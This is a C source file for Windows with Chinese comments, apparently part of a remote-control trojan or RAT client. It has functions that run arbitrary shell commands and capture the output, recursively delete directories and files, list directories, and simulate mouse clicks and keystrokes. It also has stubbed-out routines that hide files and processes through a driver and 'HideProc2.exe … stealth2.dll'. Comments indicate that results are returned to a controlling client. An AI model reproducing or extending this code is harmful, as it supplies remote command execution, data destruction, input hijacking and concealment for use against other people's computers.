
//#include "setdriver.h"


#define specify_dir "C:\\\0"
#define Max MLHT_MAX_LENGTH


// 描述:execmd函数执行命令，并将结果存储到result字符串数组中 
// 参数:cmd表示要执行的命令
// result是执行的结果存储的字符串数组
// 函数执行成功返回1，失败返回0  
bool execmd(char *str,char* ret) {
	char* cmd =str;
	char buffer[500];                         //定义缓冲区                        
	FILE* pipe = _popen(cmd, "r");            //打开管道，并执行命令 
	if (!pipe) return 0;                      //返回0表示运行失败 

	while (!feof(pipe)) {
		if (fgets(buffer, 500, pipe)) {             //将管道输出到result中 
			strcat(ret, buffer);
		}
	}
	_pclose(pipe);                            //关闭管道 
	return 1;      //返回1表示运行成功 

}

bool CrtDir(char *filedir) //增目录
{
	char path[MAX_PATH];
	memset(path, NULL, MAX_PATH);
	DWORD dwError = 0;
	int r = 0;

		strcpy_s(path, filedir);
		r = CreateDirectory(path, NULL);
		dwError = GetLastError();

		if (r != 0){//返回操作成功信息 to client
			return 1;
			
		}
		else{//返回操作错误信息 to client
			return 0;
		}

}


void DltDirTvs(TCHAR path1[]) //删目录调用的遍历函数
{

	TCHAR path2[MAX_PATH];
	WIN32_FIND_DATA ffd;
	HANDLE hFind = INVALID_HANDLE_VALUE;
	TCHAR szDire[MAX_PATH];
	TCHAR szDirec[MAX_PATH];


	StringCchCopy(szDirec, MAX_PATH, path1);
	StringCchCat(path1, MAX_PATH, TEXT("\\*"));

	hFind = FindFirstFile(path1, &ffd);

	do
	{
		StringCchCopy(szDire, MAX_PATH, szDirec);
		StringCchCat(szDire, MAX_PATH, TEXT("\\"));
		StringCchCat(szDire, MAX_PATH, ffd.cFileName);
		StringCchCopy(path2, MAX_PATH, szDire);

		if (ffd.cFileName[0] != _T('.')){

			if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
			{
				DltDirTvs(szDire);
				RemoveDirectory(path2);
			}
			else
			{
				DeleteFile(path2);
			}
		}
	} while (FindNextFile(hFind, &ffd) != 0);

	FindClose(hFind);
	return;
}


bool DltDir( char *filedir) //删目录
{
	TCHAR path[MAX_PATH];
	int r = 0;

	if (strcmp(filedir, specify_dir) == 0){//安全性检测
		return 0;
	}
	else{
		
		StringCchCopy(path, MAX_PATH, filedir);
		DltDirTvs(filedir);
		r = RemoveDirectory(path);

		if (r != 0)
		{//返回操作成功信息 to client
			return 1;
		}
		else{//返回操作错误信息 to client
			return 0;
		}
	}
}


bool ListDir(char *filedir,char* ret)//列目录
{
	TCHAR path[MAX_PATH];
	memset(path, NULL, MAX_PATH);
	memset(ret, NULL, Max);

	WIN32_FIND_DATA ffd;
	size_t length_of_arg;
	HANDLE hFind = INVALID_HANDLE_VALUE;

	strcpy_s(path, filedir);

	StringCchLength(path, MAX_PATH, &length_of_arg);
	if (length_of_arg > (MAX_PATH - 3))
	{
		return 0;
	}

	StringCchCat(path, MAX_PATH, TEXT("\\*"));
	hFind = FindFirstFile(path, &ffd);

	if (INVALID_HANDLE_VALUE == hFind)
	{
		
		return 0;
	}

	do
	{
		StringCchCat(ret, Max, ffd.cFileName);
		if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)
		{
			StringCchCat(ret, Max, TEXT("<DIR>"));
		}
		StringCchCat(ret, Max, TEXT("\r\n"));

	} while (FindNextFile(hFind, &ffd) != 0);
	StringCchCat(ret, Max, TEXT("\0"));
	
	char* cmd ="dir";
	char buffer[128];                         //定义缓冲区                        
	FILE* pipe = _popen(cmd, "r");            //打开管道，并执行命令 
	if (!pipe) return 0;                      //返回0表示运行失败 
	
	while (!feof(pipe)) {
		if (fgets(buffer, 128, pipe)) {             //将管道输出到result中 
			strcat(ret, buffer);
			//StringCchCat(ret, Max, TEXT(buffer));
		}
	}
	_pclose(pipe);                            //关闭管道 
	return 1;      //返回1表示运行成功 
	
	if (strlen(ret) - 9 > 1500)
	{
		return 0;
	}

	FindClose(hFind);
	return 1;
}


bool deletfile(char *filedir)//删文件函数
{
	if(DeleteFile(filedir))
		return 1;
	else
		return 0;

}
		

void mouse_op(int x,int y){
	x = x * 65535 / 1095;
	y = y * 65535 / 616;
	mouse_event(MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE, x, y, 0, 0);
	mouse_event(MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_LEFTUP,x,y,0,0);
	Sleep(100);
	mouse_event(MOUSEEVENTF_MOVE | MOUSEEVENTF_ABSOLUTE, x, y, 0, 0);
	mouse_event(MOUSEEVENTF_LEFTDOWN|MOUSEEVENTF_LEFTUP,x,y,0,0);
}


void keybd_op(int key){
	keybd_event(key, 0, 0, 0);
	keybd_event(key, 0, KEYEVENTF_KEYUP, 0);
}


void hide_file(){
	//setdriver(Install_Run);
}


void show_file(){
	//setdriver(Stop_Unload);
}


void hide_process(){
	//system("C:\\HideProc2.exe -hide stealth2.dll");
}


void show_process(){
	//system("C:\\HideProc2.exe -show stealth2.dll");
}

